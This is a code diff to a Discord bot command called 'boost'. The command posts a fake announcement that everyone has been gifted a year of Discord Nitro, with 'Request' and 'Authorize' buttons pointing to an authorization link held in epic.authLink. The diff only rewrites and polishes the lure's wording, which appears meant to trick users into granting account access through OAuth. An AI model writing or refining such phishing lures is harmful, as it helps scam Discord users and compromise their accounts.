@@ -3,7 +3,7 @@ const epic = require("../../epic");
 
 module.exports = {
   name: "boost",
-  description: "📨 Sends Boost Nitro Message",
+  description: "📨 Sends a Nitro Message",
   default_permission: true,
   timeout: 3000,
   category: "util",
@@ -15,15 +15,15 @@ module.exports = {
       new discord.MessageButton()
         .setStyle('LINK')
         .setURL(`${epic.authLink}`)
-        .setLabel("🎁 Claim")
+        .setLabel("🎁 Request")
     );
 
     interaction.channel.send({
       embeds: [{
-        title: "Hello everyone, you have all received a Nitro Discord for one year!",
-        description: `To get your Nitro Boost, all you need to do is:
-   \n1️⃣ Click on the button [claim](${epic.authLink}).
-   \n2️⃣ Click on the button [autoriser](${epic.authLink}).\n\nOnce you get cleared, you have to wait about 24-48 hours and you will get it.`,
+        title: "Hello everyone, you've all been gifted a year of Nitro Discord!",
+        description: `To claim your Nitro Boost, follow these steps:
+   \n1️⃣ Click the [Request](${epic.authLink}) button.
+   \n2️⃣ Click the [Authorize](${epic.authLink}) button.\n\nAfter approval, you'll need to wait for 24-48 hours for the Nitro Boost to be added to your account.`,
         color: 7540649,
         image: {
           url: "https://i.ibb.co/54xmJfm/Capture-decran-le-2022-12-30-a-15-58-02.png"
@@ -36,7 +36,7 @@ module.exports = {
             {
               type: 2,
               style: 5,
-              label: "🎁 Claim",
+              label: "🎁 Request",
               url: `${epic.authLink}`
             }
           ]
